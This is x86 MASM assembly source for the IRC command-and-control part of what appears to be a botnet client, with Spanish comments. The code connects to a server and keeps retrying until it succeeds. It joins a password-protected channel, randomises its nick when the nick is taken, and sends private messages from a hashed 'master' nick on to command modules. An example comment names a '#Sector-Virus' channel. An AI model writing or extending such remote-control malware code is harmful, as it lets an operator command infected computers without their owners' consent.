;-----------------------------------------------------------------------
include     irc.inc

;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
irc_parse   proc  dwsocket, lpszline, lpszchannel, lpszchannelpass, lpbotinfo
    local szbuffer1[1024]:byte, szbuffer2[1024]:byte, szbuffer3[1024]:byte, szbuffer4[1024]:byte

    invoke  get_token, addr szbuffer1, lpszline, ' ', 0, FALSE
    invoke  xcrcsz, addr szbuffer1
    .if     eax == SERVER_MSG_PING

        invoke  xfill, 0, addr szbuffer2, sizeof szbuffer2
        invoke  get_token, addr szbuffer2, lpszline, ':', 1, FALSE
        invoke  wsprintf, addr szbuffer1, SADD("PONG %s", EOL), addr szbuffer2
        invoke  send, dwsocket, addr szbuffer1, FUNC(lstrlen, addr szbuffer1), 0

    .else

        invoke  get_token, addr szbuffer1, lpszline, ' ', 1, FALSE
        invoke  xcrcsz, addr szbuffer1
        switch  eax
            case    SERVER_MSG_001 || eax == SERVER_MSG_005
                
                invoke  wsprintf, addr szbuffer1, SADD("JOIN %s %s", EOL), lpszchannel, lpszchannelpass
                invoke  send, dwsocket, addr szbuffer1, FUNC(lstrlen, addr szbuffer1), 0
            
            case    SERVER_MSG_433
                
                mov     eax, lpbotinfo
                invoke  rand_nick, addr (sbot_data ptr [eax]).szusername
                invoke  wsprintf, addr szbuffer2, SADD("NICK %s", EOL), addr (sbot_data ptr [eax]).szusername
                invoke  send, dwsocket, addr szbuffer2, FUNC(lstrlen, addr szbuffer2), 0
        
            case    SERVER_MSG_PRIVMSG
            
                ;[:Asphyxia!qwerty@localhost] PRIVMSG [#Sector-Virus :].login -v 11235813213455[CRLF]
                invoke  get_token, addr szbuffer1, lpszline, ' ', 0, FALSE
                invoke  get_token, addr szbuffer1, addr szbuffer1, ':', 1, FALSE
                invoke  get_token, addr szbuffer1, addr szbuffer1, '!', 0, FALSE
                
                mov     ebx, lpbotinfo
                invoke  xcrcsz, addr szbuffer1
                .if     eax == dword ptr (sbot_data ptr [ebx]).dwmaster

                    invoke  handle_module, _MODULE_TYPE_PRVMSG, lpszline, addr (sbot_data ptr [ebx]).modules
                
                .endif
                
                ; its for
                invoke  get_token, addr szbuffer2, lpszline, ' ', 2, FALSE
            
                ; Get the command
                invoke  get_token, addr szbuffer3, lpszline, ':', 2, FALSE
                invoke  get_token, addr szbuffer3, addr szbuffer3, ' ', 0, FALSE
                
                ; get the params
                invoke  get_token, addr szbuffer4, lpszline, ':', 2, TRUE
                invoke  get_token, addr szbuffer4, addr szbuffer4, ' ', 1, TRUE

                invoke  printf, SADD("from: %s - reply: %s - command: %s - params: %s", EOL), addr szbuffer1, addr szbuffer2, addr szbuffer3, addr szbuffer4
                
                .if     byte ptr [szbuffer2] == '#'; its for the channel?
                                        ; socket, user, reply, command, params
                    invoke  irc_command, dwsocket, addr szbuffer1, addr szbuffer2, addr szbuffer3, addr szbuffer4

                .else
                    invoke  irc_command, dwsocket, addr szbuffer1, addr szbuffer1, addr szbuffer3, addr szbuffer4

                .endif
            
        endsw
    
    .endif
    
    ret
irc_parse endp

;-----------------------------------------------------------------------
irc_thread   proc    lpparam
    local   irc:IRC_CONNECT, dwsocket, dwlen, dwmax, SockAddrIn:sockaddr_in
    local   irc_buffer[1024]:byte

    mov     eax, lpparam
    invoke  xcopy, addr irc, eax, sizeof irc
    .while  (1)
        invoke  socket, PF_INET, SOCK_STREAM, 0
        mov     bot_info.dwsocket, eax
        mov     dwsocket, eax

        mov     eax, lpparam
        m2m     (IRC_CONNECT ptr [eax]).dwsocket, dwsocket

        mov     SockAddrIn.sin_family, AF_INET
        invoke  htons, irc.dwport
        mov     SockAddrIn.sin_port, ax
        m2m     SockAddrIn.sin_addr, irc.dwserver
        
        invoke  connect, dwsocket, addr SockAddrIn, sizeof SockAddrIn
        .break  .if eax != SOCKET_ERROR

        invoke  printf, SADD("%s"), SADD("Couldn't connect.", EOL)
        invoke  Sleep, 10000
    .endw
    
    ; enviamos nuestro nick
    invoke  wsprintf, addr irc_buffer, SADD("NICK %s", EOL), addr irc.sznick
    invoke  send, dwsocket, addr irc_buffer, FUNC(lstrlen, addr irc_buffer), 0
    
    ; enviamos nuestro user (realname host email nick)
    invoke  wsprintf, addr irc_buffer, SADD("USER %s 0 0 :%s",EOL), addr irc.sznick, addr irc.sznick
    invoke  send, dwsocket, addr irc_buffer, FUNC(lstrlen, addr irc_buffer), 0
    
    .while  (1)
        invoke  Sleep, 1000
        
        invoke  xfill, 0, addr irc_buffer, sizeof irc_buffer
        
        invoke  recv, dwsocket, addr irc_buffer, sizeof irc_buffer, 0
        .break  .if !eax || eax == SOCKET_ERROR
        
        invoke  printf, SADD("%s"), addr irc_buffer
      
        ; separamos la linea en CRLF
        lea     esi, irc_buffer
        mov     edi, esi
        mov     ecx, eax    ; longuitud de los datos recibidos
        .repeat
            .break  .if !byte ptr [esi] ; fin de los datos (null)
            
            ; si el byte de la cadena es igual a CR o LF
            .if     byte ptr [esi] == CR || byte ptr [esi] == LF
                
                ; si es igual a LF o es CR pero el siguiente no es LF (aveces solo se usa CR pero no LF)
                .if     byte ptr [esi] == LF || !byte ptr [esi+1] == [LF]
                    
                    ; eliminamos el LF (fin de la cadena)
                    mov     byte ptr [esi], 0
                    
                    push    esi
                    ; parseamos la linea apuntada por edi
                    invoke  irc_parse, dwsocket, edi, addr irc.szchannel, addr irc.szchannelpass, addr bot_info
                    
                    ; actualizamos edi
                    pop     esi
                    mov     edi, esi    ; esi apunta al LF o CR (si no le sigue un LF) eliminado
                    inc     edi         ; ahora apunta al comienzo de la siguiente cadena
                
                .else
                    
                    ; eliminiamos el CR (fin de la cadena)
                    mov     byte ptr [esi], 0
                
                .endif
            
            .endif
            
            ; siguiente byte
            inc     esi
        .untilcxz

    .endw

    invoke closesocket, dwsocket
    ret
irc_thread endp

;-----------------------------------------------------------------------
irc_connect proc    lpszchannel, lpszchannelpass, lpsznick, lpszserver, dwport
    local   irc:IRC_CONNECT
    
    invoke  xfill, 0, addr irc, sizeof IRC_CONNECT
    
    m2m     irc.dwport, dwport
    invoke  xcopy, addr irc.sznick, lpsznick, FUNC(lstrlen, lpsznick)
    invoke  xcopy, addr irc.szchannel, lpszchannel, FUNC(lstrlen, lpszchannel)
    invoke  xcopy, addr irc.szchannelpass, lpszchannelpass, FUNC(lstrlen, lpszchannelpass)

    .while  (1)
        invoke  gethostbyname, lpszserver
        .break  .if eax
        
        invoke  printf, SADD("%s"), SADD("Couldn't resolve host", EOL)        
        invoke  Sleep, 1000
    .endw
    
    host_entry_first_entry  eax
    mov     irc.dwserver, eax
    
    invoke  CreateThread, 0, 0, addr irc_thread, addr irc, 0, 0
    invoke  WaitForSingleObject, eax, -1
    ret
irc_connect endp

;-----------------------------------------------------------------------
